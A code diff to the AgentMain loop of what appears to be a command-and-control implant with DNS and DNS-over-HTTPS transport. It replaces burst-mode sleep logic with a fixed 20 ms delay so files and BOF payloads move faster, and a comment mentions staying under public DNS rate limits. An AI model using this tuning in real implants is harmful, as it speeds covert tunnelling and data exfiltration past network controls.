@@ -394,15 +394,9 @@ void AgentMain()
 			}
 
 			if (burst) {
-				// 加速模式：强制将 sleep 限制在 50ms 以内，以实现连续快速传输（约 10-15 QPS）。
-				// 这既能显著加快 BOF/大文件传输速度，又通过 50ms 间隔保持在公共 DNS 的安全限流阈值内。
-				ULONG burstSleep = 20;
-				if (baseSleep < burstSleep)
-					burstSleep = baseSleep;
-				
-				WaitMask(g_Agent->GetWorkingSleep(), burstSleep, 0); // jitter 设为 0 以保持稳定速率
-				
-				// 用完一轮后清零统计，后续再根据新一轮大任务重新进入 burst
+				// Burst mode: 20ms sleep for fast transfers (~50 QPS theoretical)
+				// NOTE: mySleep() takes milliseconds directly, WaitMask() expects seconds!
+				mySleep(20);
 				g_Connector->ResetTrafficTotals();
 			} else {
 				// 正常情况下沿用原始 sleep/jitter
@@ -591,10 +585,8 @@ void AgentMain()
 
 			if (burst) {
 				DohDebugLog("[DoH] Sleep: burst mode");
-				ULONG burstSleep = 50;
-				if (baseSleep < burstSleep)
-					burstSleep = baseSleep;
-				WaitMask(g_Agent->GetWorkingSleep(), burstSleep, 0);
+				// NOTE: mySleep() takes milliseconds directly, WaitMask() expects seconds!
+				mySleep(20);
 				g_Connector->ResetTrafficTotals();
 			} else {
 				DohDebugLog("[DoH] Sleep: normal mode");
@@ -836,10 +828,8 @@ void AgentMain()
 
 			if (burst) {
 				// Burst mode: 20ms sleep for fast transfers (~50 QPS theoretical)
-				ULONG burstSleep = 20;
-				if (baseSleep < burstSleep)
-					burstSleep = baseSleep;
-				WaitMask(g_Agent->GetWorkingSleep(), burstSleep, 0);
+				// NOTE: mySleep() takes milliseconds directly, WaitMask() expects seconds!
+				mySleep(20);
 				TX_RESET_TOTALS();
 			} else {
 				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
